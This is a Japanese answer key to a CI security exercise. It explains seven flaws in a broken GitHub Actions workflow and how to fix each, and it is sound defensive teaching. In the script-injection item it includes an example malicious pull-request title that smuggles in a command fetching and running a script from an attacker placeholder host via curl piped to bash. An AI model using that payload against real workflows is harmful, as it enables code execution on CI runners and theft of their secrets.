# 演習の解答 — `exercises/99-broken.yml` の問題点

<details>
<summary>まず自分で 7 つ挙げてから開いてください</summary>

## 1. `permissions` が無い

```yaml
jobs:
  build:
    runs-on: ubuntu-latest # permissions の宣言がない
```

書かないと **組織 / リポジトリ設定の既定値** に依存します。設定を引き継いだ古い組織では
書き込み権限のままになっていることがあり、「同じ YAML なのにリポジトリによって挙動が違う」
という再現性のない状態になります。

**直し方**

```yaml
permissions:
  contents: read # トップレベルで絞り、必要なジョブでだけ足す
```

---

## 2. Action がタグ / ブランチ参照になっている

```yaml
- uses: actions/checkout@v5
- uses: actions/setup-node@main # ← 特に危険
```

タグは付け替えられます。`@main` に至っては、上流にコミットが入った瞬間に
自分の CI で動くコードが変わります。

**直し方** — コミット SHA で固定し、コメントでバージョンを残す

```yaml
- uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v5.0.0
```

更新は Dependabot に任せます（`.github/dependabot.yml` 参照）。

---

## 3. `npm install` を使っている

```yaml
- run: npm install
```

ロックファイルを無視して依存が動きうるので、**CI の再現性が壊れます**。

**直し方**

```yaml
- run: npm ci
```

---

## 4. スクリプトインジェクション

```yaml
- run: echo "building PR: ${{ github.event.pull_request.title }}"
```

`${{ }}` は `run:` の中で **シェルスクリプトとして展開されます**。PR タイトルは
攻撃者が自由に決められるので、次のようなタイトルを付けられると任意コードが実行されます。

```
"; curl -s https://attacker.example/x.sh | bash #
```

**直し方** — `env:` を経由して、クォートして参照する

```yaml
- env:
    PR_TITLE: ${{ github.event.pull_request.title }}
  run: echo "building PR: $PR_TITLE"
```

---

## 5. シークレットをログとコマンドライン引数に渡している

```yaml
run: |
  echo "deploying with token ${{ secrets.DEPLOY_TOKEN }}"
  ./scripts/deploy.sh --token "${{ secrets.DEPLOY_TOKEN }}"
```

2 つ問題があります。

- `echo` でログに出そうとしている（マスクは効きますが、加工されると漏れます。例: `base64` してから出力）
- コマンドライン引数は同じマシン上の他プロセスから `ps` で見えます

**直し方** — 環境変数で渡す

```yaml
- env:
    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
  run: ./scripts/deploy.sh
```

---

## 6. 素性の分からないサードパーティ Action

```yaml
- uses: some-random-user/cool-action@v1
```

Action は **ランナー上でフルの権限で動きます**。`GITHUB_TOKEN`、環境変数、
チェックアウト済みのソースコードすべてにアクセスできます。

**直し方**

- 組織の Actions ポリシーで許可リストを設定する（`Allow <org> actions and reusable workflows` + 明示的な許可）
- 使う場合は SHA 固定し、ソースを読む
- 数行で済む処理なら、Action ではなく `run:` で書く

---

## 7. トリガーの絞り込みと `concurrency` が無い

```yaml
on:
  workflow_dispatch: # 本来はここに push / pull_request が入る想定
```

`paths` / `branches` の絞り込みが無いと不要な実行が走り、`concurrency` が無いと
連続 push のたびに古い実行が走り続けます。モノレポでは特に効きます。

**直し方**

```yaml
on:
  pull_request:
    branches: [main]
    paths: ["src/**", "package.json"]

concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: true
```

---

## おまけ（気づいたら上級者）

- **ジョブが 1 つしかない** — テストとデプロイが同じジョブなので、テストだけ再実行できません
- **`timeout-minutes` が無い** — ハングしたジョブが上限（既定 6 時間）まで課金され続けます
- **デプロイに `environment:` が無い** — 承認ゲートも監査履歴も残りません
- **通知の `curl` にエラーハンドリングが無い** — 失敗しても気づけません（`--fail` を付ける）

</details>
